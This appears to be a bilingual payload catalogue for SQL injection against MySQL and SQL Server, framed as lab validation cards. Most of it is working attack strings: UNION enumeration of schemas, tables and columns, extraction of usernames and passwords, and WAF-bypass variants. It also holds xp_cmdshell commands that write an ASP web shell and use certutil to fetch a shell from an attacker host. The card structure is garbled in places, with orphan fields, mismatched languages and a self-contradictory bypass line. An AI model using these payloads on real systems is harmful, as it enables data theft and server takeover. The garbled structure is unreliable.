name.zh: MySQL 联合查询与元数据注入验证
name.en: MySQL Union and Metadata Injection Validation

description.zh: 覆盖布尔对照、列数推断、UNION 类型对齐、information_schema 元数据读取与 MySQL 注释/版本注释变体，用于确认字符串输入是否改变真实 MySQL 查询结构。
description.en: Covers Boolean controls, column-count inference, UNION type alignment, information_schema metadata reads, and MySQL comment or version-comment variants to confirm whether string input alters a real MySQL query.

prerequisites.zh: 已通过错误签名、驱动或版本函数确认后端为 MySQL，并知道参数处于字符串、数字或排序上下文。
prerequisites.en: The backend is confirmed as MySQL through errors, driver evidence, or version output, and the parameter context is known as string, numeric, or ordering.

prerequisites.zh: 隔离数据库只包含专用 schema、表和 marker 行，能够记录最终 SQL、绑定参数、数据库错误和同一请求 ID。
prerequisites.en: An isolated database contains a dedicated schema, table, and marker row, with final SQL, bind parameters, database errors, and the same request identifier observable.

title.zh: 1. 探测注入点

description.zh: 使用单引号和布尔条件探测是否存在注入点
description.en: Use single quotes and boolean conditions to detect injection points

title.zh: MySQL注入 - 基础探测 验证 2

execution.command:
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

description.zh: 在授权实验室中运行 MySQL注入 - 基础探测 的第 2 条验证，只记录响应、错误和审计日志，不访问非目标资源。
description.en: Run sqli-mysql-basic verification 2 in an authorized lab and record only responses, errors, and audit logs without accessing unrelated resources.

explanation.en: Describes how the value segment "ORDER BY" participates in this validation command.

title.zh: 3. 确定显示位置

description.zh: 找出哪些列会显示在页面上
description.en: Identify which columns are displayed on the page

explanation.en: Numeric markers to identify display positions

title.zh: 4. 获取数据库信息

execution.command:
' UNION SELECT 1,database(),3--
' UNION SELECT 1,user(),3--
' UNION SELECT 1,version(),3--
' UNION SELECT 1,@@hostname,3--

description.zh: 获取当前数据库名、用户、版本等基础信息
description.en: Enumerate the current database name, user, version, and other basic information.

title.zh: 5. 枚举所有数据库

execution.command:
' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--
' UNION SELECT schema_name,2,3 FROM information_schema.schemata LIMIT 0,1--

description.zh: 获取MySQL服务器上所有数据库名
description.en: Enumerate all database names on the MySQL server.

explanation.zh: MySQL系统数据库，存储元数据
存储所有数据库名的表

explanation.en: Concatenate multiple rows into a single row

title.zh: 6. 枚举表名

execution.command:
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema='target_db' LIMIT 0,1--

description.zh: 获取指定数据库中的所有表名
description.en: Enumerate all table names in the specified database.

explanation.zh: 存储所有表信息的系统表

explanation.en: Database name the table belongs to

title.zh: 7. 枚举列名

execution.command:
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users' AND table_schema=database() LIMIT 0,1--

description.zh: 获取指定表的所有列名
description.en: Enumerate all column names in the specified table.

explanation.zh: 存储所有列信息的系统表

title.zh: 8. 提取数据

execution.command:
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--
' UNION SELECT username,password,3 FROM users LIMIT 0,1--

description.zh: 从目标表中提取敏感数据
description.en: Extract sensitive data from the target table.

explanation.zh: 冒号的十六进制，用于分隔符

analysis.zh: 阳性证据是同一入口的真/假谓词产生可重复差异，或列数/类型对齐后 UNION 返回专用 marker；最终数据库语句须显示可控片段脱离数据绑定。 假阳性边界：仅有 HTTP 200/500、语法错误、WAF 告警、页面长度波动、information_schema 字样回显、错误列数或人工在数据库控制台执行都不能证明应用 SQL 注入。
analysis.en: Positive evidence requires repeatable true and false predicate differences at the same entry or a dedicated marker returned after UNION column and type alignment; the final database statement must show controlled text escaping data binding. False-positive boundary: HTTP 200 or 500, syntax errors, WAF alerts, page-length noise, reflected information_schema text, wrong column counts, or manual database-console execution does not prove application SQL injection.

opsecTips.zh: MySQL 基础验证不读取真实 users、password 或其他 schema；出现生产行、查询计划膨胀、锁等待、错误风暴或数据库负载时立即停止。
opsecTips.en: MySQL basic validation never reads real users, passwords, or other schemas; stop on production rows, plan expansion, lock waits, error storms, or database load.

opsecTips.zh: 删除合成 schema/表/marker 和测试会话，清理查询缓存、慢日志与响应副本，恢复参数化路径后重放真/假与正常输入。
opsecTips.en: Delete synthetic schemas, tables, markers, and test sessions, clear query caches, slow logs, and response copies, restore parameterization, and replay true, false, and normal inputs.

explanation.zh: 混合大小写绕过简单关键字匹配
explanation.en: Mixed-case bypass for simple keyword matching

description.en: Double-write keywords to bypass replacement filtering

WAF removes SELECT, leaving SELECT intact

description.zh: 使用注释、换行、括号替代空格
description.en: Use comments, newlines, and parentheses instead of spaces

wafBypass.command:
' UNION SELECT 1,hex(database()),3--
' UNION SELECT 1,unhex(hex(database())),3--
' UNION SELECT 1,conv(hex(database()),16,10),3--

description.zh: 使用编码函数绕过关键字检测
description.en: Use encoding functions to bypass critical-character detection

title.zh: 确认MySQL UNION 与元数据前提
title.en: Confirm MySQL UNION and Metadata prerequisites

description.zh: 针对MySQL 联合查询与元数据注入验证先确认数据库类型、输入上下文、隔离资产、最小权限和可观测日志，未满足两项前置条件时不进入命令审查。
description.en: For MySQL Union and Metadata Injection Validation, confirm the database type, input context, isolated asset, least privilege, and observable logs; do not proceed to command review until both prerequisites hold.

title.zh: 建立MySQL UNION 与元数据对照
title.en: Establish MySQL UNION and Metadata controls

description.zh: 为MySQL 联合查询与元数据注入验证记录正常输入、无效输入和固定 marker 的响应、查询日志、绑定值及请求标识，先量化自然波动再判断差异。
description.en: For MySQL Union and Metadata Injection Validation, record responses, query logs, bound values, and request identifiers for normal input, invalid input, and a fixed marker, measuring natural variation before judging differences.

title.zh: 逐行审校MySQL UNION 与元数据源命令
title.en: Review the MySQL UNION and Metadata source command line by line

description.zh: 原始首条命令在此逐字节保留，只用于证明条目来源和行路由；任何实际运行都必须遵守本条记录的隔离、marker、停止和清理条件。
description.en: The original first command is retained here byte for byte only to prove provenance and line routing; any execution must obey this entry's isolation, marker, stop, and cleanup conditions.

title.zh: 修复并回归MySQL UNION 与元数据
title.en: Remediate and regress MySQL UNION and Metadata

description.zh: 应用MySQL 联合查询与元数据注入验证对应修复后，重放三组对照并关联同一请求证据，确认业务结果保持正常、注入证据消失且测试状态已清理。
description.en: After applying the remediation for MySQL Union and Metadata Injection Validation, replay all three controls with correlated request evidence and confirm business behavior remains correct, injection evidence disappears, and test state is removed.

overview.zh: 覆盖布尔对照、列数推断、UNION 类型对齐、information_schema 元数据读取与 MySQL 注释/版本注释变体，用于确认字符串输入是否改变真实 MySQL 查询结构。 本教程把“能被输入触达”“数据库实际解释”和“形成可复验证据”分开审查。已通过错误签名、驱动或版本函数确认后端为 MySQL，并知道参数处于字符串、数字或排序上下文。隔离数据库只包含专用 schema、表和 marker 行，能够记录最终 SQL、绑定参数、数据库错误和同一请求 ID。
overview.en: Covers Boolean controls, column-count inference, UNION type alignment, information_schema metadata reads, and MySQL comment or version-comment variants to confirm whether string input alters a real MySQL query. This tutorial reviews input reachability, actual database interpretation, and reproducible evidence as separate claims. The backend is confirmed as MySQL through errors, driver evidence, or version output, and the parameter context is known as string, numeric, or ordering. An isolated database contains a dedicated schema, table, and marker row, with final SQL, bind parameters, database errors, and the same request identifier observable.

vulnerability.zh: 阳性证据是同一入口的真/假谓词产生可重复差异，或列数/类型对齐后 UNION 返回专用 marker；最终数据库语句须显示可控片段脱离数据绑定。 核心判断是受控输入是否越过预期的数据绑定或查询构造边界，并由同一请求的应用与数据库证据相互印证。仅有 HTTP 200/500、语法错误、WAF 告警、页面长度波动、information_schema 字样回显、错误列数或人工在数据库控制台执行都不能证明应用 SQL 注入。
vulnerability.en: Positive evidence requires repeatable true and false predicate differences at the same entry or a dedicated marker returned after UNION column and type alignment; the final database statement must show controlled text escaping data binding. The core decision is whether controlled input crosses the intended data-binding or query-construction boundary, corroborated by application and database evidence for the same request. HTTP 200 or 500, syntax errors, WAF alerts, page-length noise, reflected information_schema text, wrong column counts, or manual database-console execution does not prove application SQL injection.

exploitation.zh: 先用 1=1/1=2 建立响应与查询日志基线，再逐列使用 NULL 对齐，只从合成表读取固定 marker；每轮只提交一行并保留 MySQL 版本、字符集与 sql_mode。 条目中的源命令仅作为逐字节审校与路由证据保留；标记为需覆盖的行在得到安全替代、隔离环境和明确授权前不执行，也不从本教程推导新的攻击命令。
exploitation.en: Establish response and query-log baselines with 1=1 and 1=2, align one column at a time with NULL, and read only a fixed marker from a synthetic table; submit one line per run and retain MySQL version, character set, and sql_mode. The source command is retained only as byte-exact editorial and routing evidence. Any line flagged for override remains unexecuted until a safe substitute, an isolated environment, and explicit authorization are in place; this tutorial derives no new attack command.

mitigation.zh: 对所有值和分页/排序选择使用参数化查询与服务端允许列表，数据库账户只授予业务 schema 的最小 SELECT 权限，并统一错误响应。 修复验收必须在相同入口重放正常业务输入、阳性对照和阴性对照，核对最终语句、绑定参数、权限与副作用均回到预期边界，并确认清理完成。
mitigation.en: 对所有值和分页/排序选择使用参数化查询与服务端允许列表，数据库账户只授予业务 schema 的最小 SELECT 权限，并统一错误响应。 修复验收必须在相同入口重放正常业务输入、阳性对照和阴性对照，核对最终语句、绑定参数、权限与副作用均回到预期边界，并确认清理完成。

name.zh: MySQL FILE 权限可见性

description.zh: 将原混合条目中属于MySQL FILE 权限可见性的命令逐行独立路由，明确技术前提、权限、副作用和可复验证据边界。
description.en: Routes every source line belonging to MySQL FILE Privilege Visibility into one focused card with explicit technical prerequisites, privileges, side effects, and reproducible evidence boundaries.

prerequisites.zh: 仅在隔离实例确认MySQL FILE 权限可见性所需组件、版本、权限和语句位置，不把另一 DBMS 的语法错误当作证据。
prerequisites.en: Confirm the component, version, privileges, and statement position required by MySQL FILE Privilege Visibility in an isolated instance; syntax errors from another DBMS are not evidence.

prerequisites.zh: 准备专用 schema、固定 PAYLOADER_MARKER、数据库审计日志与可撤销权限；真实系统文件、生产账户和外部目标不得使用。
prerequisites.en: Prepare a dedicated schema, fixed PAYLOADER_MARKER, database audit logs, and revocable privileges; do not use real system files, production accounts, or external targets.

title.zh: MySQL FILE 权限可见性主验证命令
title.en: MySQL FILE Privilege Visibility Primary Validation

execution.command:
' UNION SELECT 1,file_priv,3 FROM mysql.user WHERE user=current_user()--
' AND (SELECT file_priv FROM mysql.user WHERE user=current_user())='Y'--

description.zh: 这些行按审校后的来源逐行守恒；执行前必须把真实账户、文件、网络目标和系统命令替换为隔离 marker，并只在授权实验环境运行。
description.en: These lines are conserved exactly from the reviewed source. Before execution, replace real accounts, files, network targets, and system commands with isolated markers and run only in an authorized lab.

analysis.zh: MySQL FILE 权限可见性的阳性证据必须由同一 marker 的最终语句、权限和结果共同确认；字符串回显、解析失败、预存文件、手工控制台执行或其他技术分支均是假阳性。
analysis.en: Positive MySQL FILE Privilege Visibility evidence requires the final statement, privilege decision, and result for the same marker. Reflected strings, parse failures, preexisting files, manual console execution, or another technique branch are false positives.

opsecTips.zh: 出现生产数据、持久文件、真实外连、配置变化、锁等待、资源异常或非测试账户影响时立即停止。
opsecTips.en: Stop immediately on production data, persistent files, real egress, configuration changes, lock waits, resource anomalies, or impact to non-test accounts.

opsecTips.zh: 测试后回滚事务，删除临时 schema、marker、文件和日志目标，撤销临时权限并确认正常查询基线。
opsecTips.en: After testing, roll back transactions, remove temporary schemas, markers, files, and log targets, revoke temporary privileges, and confirm the normal-query baseline.

title.zh: 限定MySQL FILE 权限可见性前提
title.en: Constrain MySQL FILE Privilege Visibility prerequisites

description.zh: 确认MySQL FILE 权限可见性对应的实现、版本、语句上下文、权限与隔离数据均已记录。
description.en: Record the implementation, version, statement context, privileges, and isolated data required by MySQL FILE Privilege Visibility.

title.zh: 提交MySQL FILE 权限可见性主命令
title.en: Submit the MySQL FILE Privilege Visibility primary command

description.zh: 仅提交 execution[0] 的审校命令组，并为本次请求绑定唯一 marker 与数据库审计标识。
description.en: Submit only the reviewed execution[0] command group and bind a unique marker and database audit identifier to the request.

attackChain.payload:
' UNION SELECT 1,file_priv,3 FROM mysql.user WHERE user=current_user()--
' AND (SELECT file_priv FROM mysql.user WHERE user=current_user())='Y'--

title.zh: 关联MySQL FILE 权限可见性证据
title.en: Correlate MySQL FILE Privilege Visibility evidence

description.zh: 把同一 marker 的应用响应、最终 SQL、权限判定和数据库审计事件关联，排除回显、语法错误和其他分支。
description.en: Correlate the same marker across the application response, final SQL, privilege decision, and database audit event, excluding reflection, syntax errors, and other branches.

title.zh: 收敛MySQL FILE 权限可见性能力
title.en: Contain the MySQL FILE Privilege Visibility capability

description.zh: 撤销测试权限与临时对象，恢复参数化和最小权限配置，再重放阴性与正常业务基线。
description.en: Revoke test privileges and temporary objects, restore parameterization and least privilege, then replay negative and normal business baselines.

overview.zh: MySQL FILE 权限可见性必须从原集合中独立判断，因为它有自己的语法、权限模型和副作用边界。命令按来源守恒，但只作为隔离实验输入。
overview.en: MySQL FILE Privilege Visibility must be evaluated independently because it has its own syntax, privilege model, and side-effect boundary. Source commands are conserved but remain isolated-lab inputs.

vulnerability.zh: 风险成立需要不可信输入到达MySQL FILE 权限可见性对应语句，并在同一请求中越过预期绑定或权限边界。仅出现关键字、错误、对象名或权限拒绝均不能证明能力。
vulnerability.en: A finding requires untrusted input to reach the MySQL FILE Privilege Visibility statement and cross the intended binding or privilege boundary in the same request. Keywords, errors, object names, or denied privileges alone do not prove capability.

exploitation.zh: 先重放固定 marker 的阴性与阳性对照，再逐行测试本卡命令；涉及文件、进程、日志、网络或配置的来源值必须替换为一次性沙箱 fixture，并在首个充分证据后停止。
exploitation.en: Replay fixed-marker negative and positive controls before testing each card line. Replace source values involving files, processes, logs, networks, or configuration with disposable sandbox fixtures and stop after the first sufficient proof.

mitigation.zh: 使用参数化查询和固定操作映射，撤销应用角色不需要的高权限包、文件、网络、配置与执行能力，并在数据库审计中告警异常动态 SQL。
mitigation.en: Use parameterized queries and fixed operation mappings, revoke unneeded package, file, network, configuration, and execution privileges from the application role, and alert on abnormal dynamic SQL in database audit logs.

description.en: Correlate the same marker across the application response, final SQL, privilege decision, and database audit event, excluding reflection, syntax errors, and other branches.

description.zh: 撤销测试权限与临时对象，恢复参数化和最小权限配置，再重放阴性与正常业务基线。
description.en: Revoke test privileges and temporary objects, restore parameterization and least privilege, then replay negative and normal business baselines.

overview.zh: MySQL 服务端文件读取边界必须从原集合中独立判断，因为它有自己的语法、权限模型和副作用边界。命令按来源守恒，但只作为隔离实验输入。
overview.en: MySQL 服务端文件读取边界必须从原集合中独立判断，因为它有自己的语法、权限模型和副作用边界。命令按来源守恒，但只作为隔离实验输入。

vulnerability.zh: 风险成立需要不可信输入到达MySQL 服务端文件读取边界对应语句，并在同一请求中越过预期绑定或权限边界。仅出现关键字、错误、对象名或权限拒绝均不能证明能力。
vulnerability.en: 风险成立需要不可信输入到达MySQL 服务端文件读取边界对应语句，并在同一请求中越过预期绑定或权限边界。仅出现关键字、错误、对象名或权限拒绝均不能证明能力。

exploitation.zh: 先重放固定 marker 的阴性与阳性对照，再逐行测试本卡命令；涉及文件、进程、日志、网络或配置的来源值必须替换为一次性沙箱 fixture，并在首个充分证据后停止。
exploitation.en: Replay fixed-marker negative and positive controls before testing each card line. Replace source values involving files, processes, logs, networks, or configuration with disposable sandbox fixtures and stop after the first sufficient proof.

mitigation.zh: 使用参数化查询和固定操作映射，撤销应用角色不需要的高权限包、文件、网络、配置与执行能力，并在数据库审计中告警异常动态 SQL。

description.zh: 这些行按审校后的来源逐行守恒；执行前必须把真实账户、文件、网络目标和系统命令替换为隔离 marker，并只在授权实验环境运行。
description.en: These lines are conserved exactly from the reviewed source. Before execution, replace real accounts, files, network targets, and system commands with isolated markers and run only in an authorized lab.

analysis.zh: MySQL 服务端文件写入边界的阳性证据必须由同一 marker 的最终语句、权限和结果共同确认；字符串回显、解析失败、预存文件、手工控制台执行或其他技术分支均是假阳性。

opsecTips.zh: 测试后回滚事务，删除临时 schema、marker、文件和日志目标，撤销临时权限并确认正常查询基线。
opsecTips.en: After testing, roll back transactions, remove temporary schemas, markers, files, and log targets, revoke temporary privileges, and confirm the normal-query baseline.

description.zh: 覆盖布尔条件、版本/身份、数据库、sys.* 与 information_schema 目录视图，以及 SQL Server 类型转换和注释语义。
description.en: Covers Boolean predicates, version and identity, databases, sys and information_schema catalog views, plus SQL Server conversion and comment semantics.

prerequisites.zh: 已确认后端为 Microsoft SQL Server，并知道参数引号、列数、数据类型和当前数据库兼容级别。
prerequisites.en: The backend is confirmed as Microsoft SQL Server, with parameter quoting, column count, data types, and current database compatibility level known.

prerequisites.zh: 隔离数据库提供合成 schema/users marker，Extended Events 或等价审计可记录最终批次、登录身份和响应请求 ID。
prerequisites.en: An isolated database provides synthetic schema and user markers, while Extended Events or equivalent audit records final batches, login identity, and response request identifiers.

title.zh: 1. 探测注入点

description.zh: 基础注入探测
description.en: Basic injection detection

title.zh: 2. 获取版本信息

execution.command:
' UNION SELECT 1,@@version,3--
' UNION SELECT 1,SERVERPROPERTY('Edition'),3--
' UNION SELECT 1,SERVERPROPERTY('ProductVersion'),3--

description.zh: 获取MSSQL版本信息
description.en: Enumerate MSSQL version information.

title.zh: 3. 获取用户信息

execution.command:
' UNION SELECT 1,user_name(),3--
' UNION SELECT 1,suser_name(),3--
' UNION SELECT 1,system_user,3--
' UNION SELECT 1,is_srvrolemember('sysadmin'),3--

description.zh: 获取当前用户及权限信息
description.en: Enumerate the current user and effective privileges.

explanation.zh: 检查是否属于服务器角色
explanation.en: Check if belongs to server role

title.zh: 4. 获取数据库信息

execution.command:
' UNION SELECT 1,db_name(),3--
' UNION SELECT 1,db_name(0),3--
' UNION SELECT 1,db_name(1),3--
' UNION SELECT name,2,3 FROM master..sysdatabases--

description.zh: 获取所有数据库名
description.en: Enumerate all database names.

explanation.zh: 系统数据库，存储所有库信息

title.zh: 5. 获取表名

execution.command:
' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--
' UNION SELECT 1,name,3 FROM sys.tables--
' UNION SELECT 1,table_name,3 FROM information_schema.tables--

description.zh: 获取用户表名
description.en: Enumerate user table names.

title.zh: 6. 获取列名

execution.command:
' UNION SELECT 1,name,3 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--

description.zh: 获取指定表的列名
description.en: Enumerate columns in the specified table.

title.zh: 7. 提取数据

execution.command:
' UNION SELECT 1,username+':'+password,3 FROM users--
' UNION SELECT TOP 1 username,password,3 FROM users--

description.zh: 提取表中的数据
description.en: Extract data from the table.

analysis.zh: 阳性证据是布尔对照或类型对齐 UNION 稳定改变结果并返回合成目录/数据 marker，最终 T-SQL 显示输入突破参数边界。 假阳性边界：转换错误、对象名不存在、sysadmin 返回 NULL、HTTP 状态变化、客户端拼接结果、NUL 被上游拒绝或手工 SSMS 查询都不是应用注入证据。
analysis.en: Positive evidence requires Boolean controls or a type-aligned UNION to change results consistently and return a synthetic catalog or data marker, with final T-SQL showing input escaping its parameter boundary. False-positive boundary: Conversion errors, missing objects, a NULL sysadmin result, HTTP status changes, client-side concatenation, upstream NUL rejection, or manual SSMS queries does not prove application injection.

opsecTips.zh: SQL Server 基础验证不读取真实 sysdatabases、用户凭据或跨库对象；出现生产行、锁等待、计划异常或错误洪泛时停止。
opsecTips.en: SQL Server basic validation never reads real database inventories, credentials, or cross-database objects; stop on production rows, lock waits, plan anomalies, or error flooding.

opsecTips.zh: 删除合成对象、marker 和测试登录会话，清理 Extended Events/缓存/响应副本，恢复参数化批次后回归。
opsecTips.en: Delete synthetic objects, markers, and test-login sessions, clear Extended Events, caches, and response copies, restore parameterized batches, and regress.

title.zh: Hex编码

wafBypass.command: ' UNION SELECT 1,master.dbo.fn_varbintohexstr(CAST(username AS VARBINARY)),3 FROM users--

description.zh: 使用Hex编码绕过
description.en: Use hex encoding to bypass filters

explanation.zh: 转换为十六进制字符串

title.zh: 注释绕过

description.zh: 使用注释和空字节绕过
description.en: Use comments and null bytes to bypass filters

title.en: Confirm SQL Server Basic UNION prerequisites

description.en: For SQL Server UNION and Catalog-View Injection Validation, confirm the database type, input context, isolated asset, least privilege, and observable logs; do not proceed to command review until both prerequisites hold.

title.en: Establish SQL Server Basic UNION controls

description.zh: 为SQL Server UNION 与目录视图注入验证记录正常输入、无效输入和固定 marker 的响应、查询日志、绑定值及请求标识，先量化自然波动再判断差异。
description.en: For SQL Server UNION and Catalog-View Injection Validation, record responses, query logs, bound values, and request identifiers for normal input, invalid input, and a fixed marker, measuring natural variation before judging differences.

title.zh: 逐行审校SQL Server 基础 UNION源命令
title.en: Review the SQL Server Basic UNION source command line by line

description.zh: 原始首条命令在此逐字节保留，只用于证明条目来源和行路由；任何实际运行都必须遵守本条记录的隔离、marker、停止和清理条件。
description.en: The original first command is retained here byte for byte only to prove provenance and line routing; any execution must obey this entry's isolation, marker, stop, and cleanup conditions.

title.zh: 修复并回归SQL Server 基础 UNION
title.en: Remediate and regress SQL Server Basic UNION

description.zh: 应用SQL Server UNION 与目录视图注入验证对应修复后，重放三组对照并关联同一请求证据，确认业务结果保持正常、注入证据消失且测试状态已清理。
description.en: After applying the remediation for SQL Server UNION and Catalog-View Injection Validation, replay all three controls with correlated request evidence and confirm business behavior remains correct, injection evidence disappears, and test state is removed.

overview.zh: 覆盖布尔条件、版本/身份、数据库、sys.* 与 information_schema 目录视图，以及 SQL Server 类型转换和注释语义。 本教程把“能被输入触达”“数据库实际解释”和“形成可复验证据”分开审查。已确认后端为 Microsoft SQL Server，并知道参数引号、列数、数据类型和当前数据库兼容级别。隔离数据库提供合成 schema/users marker，Extended Events 或等价审计可记录最终批次、登录身份和响应请求 ID。
overview.en: Covers Boolean predicates, version and identity, databases, sys and information_schema catalog views, plus SQL Server conversion and comment semantics. This tutorial reviews input reachability, actual database interpretation, and reproducible evidence as separate claims. The backend is confirmed as Microsoft SQL Server, with parameter quoting, column count, data types, and current database compatibility level known. An isolated database provides synthetic schema and user markers, while Extended Events or equivalent audit records final batches, login identity, and response request identifiers.

vulnerability.zh: 阳性证据是布尔对照或类型对齐 UNION 稳定改变结果并返回合成目录/数据 marker，最终 T-SQL 显示输入突破参数边界。 核心判断是受控输入是否越过预期的数据绑定或查询构造边界，并由同一请求的应用与数据库证据相互印证。转换错误、对象名不存在、sysadmin 返回 NULL、HTTP 状态变化、客户端拼接结果、NUL 被上游拒绝或手工 SSMS 查询都不是应用注入证据。
vulnerability.en: Positive evidence requires Boolean controls or a type-aligned UNION to change results consistently and return a synthetic catalog or data marker, with final T-SQL showing input escaping its parameter boundary. The core decision is whether controlled input crosses the intended data-binding or query-construction boundary, corroborated by application and database evidence for the same request. Conversion errors, missing objects, a NULL sysadmin result, HTTP status changes, client-side concatenation, upstream NUL rejection, or manual SSMS queries does not prove application injection.

exploitation.zh: 从 1=1/1=2 和 NULL 列对齐开始，只读取专用目录对象与 marker 行，记录数据库/登录上下文和 NVARCHAR/VARCHAR 类型差异。 条目中的源命令仅作为逐字节审校与路由证据保留；标记为需覆盖的行在得到安全替代、隔离环境和明确授权前不执行，也不从本教程推导新的攻击命令。
exploitation.en: Start with 1=1 and 1=2 plus NULL column alignment, read only dedicated catalog objects and marker rows, and record database or login context plus NVARCHAR and VARCHAR differences. The source command is retained only as byte-exact editorial and routing evidence. Any line flagged for override remains unexecuted until a safe substitute, an isolated environment, and explicit authorization are in place; this tutorial derives no new attack command.

mitigation.zh: 使用 sp_executesql 参数绑定而非字符串拼接，动态标识符采用固定映射，应用登录只授予业务 schema 权限并隐藏数据库错误。 修复验收必须在相同入口重放正常业务输入、阳性对照和阴性对照，核对最终语句、绑定参数、权限与副作用均回到预期边界，并确认清理完成。
mitigation.en: Use sp_executesql parameter binding instead of concatenation, map dynamic identifiers to fixed choices, grant the application login business-schema rights only, and hide database errors. Acceptance testing replays normal business input plus positive and negative controls at the same entry point, verifies final statements, bindings, privileges, and side effects return to the intended boundary, and confirms cleanup is complete.

name.zh: SQL Server xp_cmdshell 能力边界

description.zh: 将原混合条目中属于SQL Server xp_cmdshell 能力边界的命令逐行独立路由，明确技术前提、权限、副作用和可复验证据边界。
description.en: Routes every source line belonging to SQL Server xp_cmdshell Capability Boundary into one focused card with explicit technical prerequisites, privileges, side effects, and reproducible evidence boundaries.

subCategory.zh: SQL Server xp_cmdshell 能力边界

prerequisites.zh: 仅在隔离实例确认SQL Server xp_cmdshell 能力边界所需组件、版本、权限和语句位置，不把另一 DBMS 的语法错误当作证据。
prerequisites.en: Confirm the component, version, privileges, and statement position required by SQL Server xp_cmdshell Capability Boundary in an isolated instance; syntax errors from another DBMS are not evidence.

prerequisites.zh: 准备专用 schema、固定 PAYLOADER_MARKER、数据库审计日志与可撤销权限；真实系统文件、生产账户和外部目标不得使用。
prerequisites.en: Prepare a dedicated schema, fixed PAYLOADER_MARKER, database audit logs, and revocable privileges; do not use real system files, production accounts, or external targets.

title.zh: SQL Server xp_cmdshell 能力边界主验证命令
title.en: SQL Server xp_cmdshell Capability Boundary Primary Validation

execution.command:
' UNION SELECT 1,OBJECT_ID('xp_cmdshell'),3--
'; EXEC master..xp_cmdshell 'whoami'--
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
'; EXEC master..xp_cmdshell 'whoami'--
'; EXEC master..xp_cmdshell 'net user'--
'; EXEC master..xp_cmdshell 'dir C:'--
'; EXEC master..xp_cmdshell 'echo ^<%execute(request("cmd"))^> > C:\inetpub\wwwroot\shell.asp'--
'; EXEC master..xp_cmdshell 'certutil -urlcache -split -f http://attacker/shell.aspx C:\inetpub\wwwroot\shell.aspx'--

description.zh: 这些行按审校后的来源逐行守恒；执行前必须把真实账户、文件、网络目标和系统命令替换为隔离 marker，并只在授权实验环境运行。
description.en: These lines are conserved exactly from the reviewed source. Before execution, replace real accounts, files, network targets, and system commands with isolated markers and run only in an authorized lab.

analysis.zh: SQL Server xp_cmdshell 能力边界的阳性证据必须由同一 marker 的最终语句、权限和结果共同确认；字符串回显、解析失败、预存文件、手工控制台执行或其他技术分支均是假阳性。
analysis.en: Positive SQL Server xp_cmdshell Capability Boundary evidence requires the final statement, privilege decision, and result for the same marker. Reflected strings, parse failures, preexisting files, manual console execution, or another technique branch are false positives.

opsecTips.zh: 出现生产数据、持久文件、真实外连、配置变化、锁等待、资源异常或非测试账户影响时立即停止。
opsecTips.en: Stop immediately on production data, persistent files, real egress, configuration changes, lock waits, resource anomalies, or impact to non-test accounts.

opsecTips.zh: 测试后回滚事务，删除临时 schema、marker、文件和日志目标，撤销临时权限并确认正常查询基线。
opsecTips.en: After testing, roll back transactions, remove temporary schemas, markers, files, and log targets, revoke temporary privileges, and confirm the normal-query baseline.

title.zh: SQL Server xp_cmdshell 能力边界受控变体
title.en: SQL Server xp_cmdshell Capability Boundary Controlled Variant

'; EXEC('EXEC master..xp_cmdshell ''whoami''')--
'; DECLARE @cmd VARCHAR(255); SET @cmd='whoami'; EXEC master..xp_cmdshell @cmd;--

title.zh: 关联SQL Server xp_cmdshell 能力边界证据
title.en: Correlate SQL Server xp_cmdshell Capability Boundary evidence

description.zh: 把同一 marker 的应用响应、最终 SQL、权限判定和数据库审计事件关联，排除回显、语法错误和其他分支。
description.en: Correlate the same marker across the application response, final SQL, privilege decision, and database audit event, excluding reflection, syntax errors, and other branches.

title.zh: 收敛SQL Server xp_cmdshell 能力边界能力
title.en: Contain the SQL Server xp_cmdshell Capability Boundary capability

description.zh: 撤销测试权限与临时对象，恢复参数化和最小权限配置，再重放阴性与正常业务基线。
description.en: Revoke test privileges and temporary objects, restore parameterization and least privilege, then replay negative and normal business baselines.

overview.zh: SQL Server xp_cmdshell 能力边界必须从原集合中独立判断，因为它有自己的语法、权限模型和副作用边界。命令按来源守恒，但只作为隔离实验输入。
overview.en: SQL Server xp_cmdshell Capability Boundary must be evaluated independently because it has its own syntax, privilege model, and side-effect boundary. Source commands are conserved but remain isolated-lab inputs.

vulnerability.zh: 风险成立需要不可信输入到达SQL Server xp_cmdshell 能力边界对应语句，并在同一请求中越过预期绑定或权限边界。仅出现关键字、错误、对象名或权限拒绝均不能证明能力。
vulnerability.en: A finding requires untrusted input to reach the SQL Server xp_cmdshell Capability Boundary statement and cross the intended binding or privilege boundary in the same request. Keywords, errors, object names, or denied privileges alone do not prove capability.

exploitation.zh: 先重放固定 marker 的阴性与阳性对照，再逐行测试本卡命令；涉及文件、进程、日志、网络或配置的来源值必须替换为一次性沙箱 fixture，并在首个充分证据后停止。
exploitation.en: Replay fixed-marker negative and positive controls before testing each card line. Replace source values involving files, processes, logs, networks, or configuration with disposable sandbox fixtures and stop after the first sufficient proof.

mitigation.zh: 使用参数化查询和固定操作映射，撤销应用角色不需要的高权限包、文件、网络、配置与执行能力，并在数据库审计中告警异常动态 SQL。
mitigation.en: Use parameterized queries and fixed operation mappings, revoke unneeded package, file, network, configuration, and execution privileges from the application role, and alert on abnormal dynamic SQL in database audit logs.

overview.zh: SQL Server OLE Automation 能力边界必须从原集合中独立判断，因为它有自己的语法、权限模型和副作用边界。命令按来源守恒，但只作为隔离实验输入。

vulnerability.zh: 风险成立需要不可信输入到达SQL Server OLE Automation 能力边界对应语句，并在同一请求中越过预期绑定或权限边界。仅出现关键字、错误、对象名或权限拒绝均不能证明能力。
vulnerability.en: A finding requires untrusted input to reach the SQL Server OLE Automation Capability Boundary statement and cross the intended binding or privilege boundary in the same request. Keywords, errors, object names, or denied privileges alone do not prove capability.

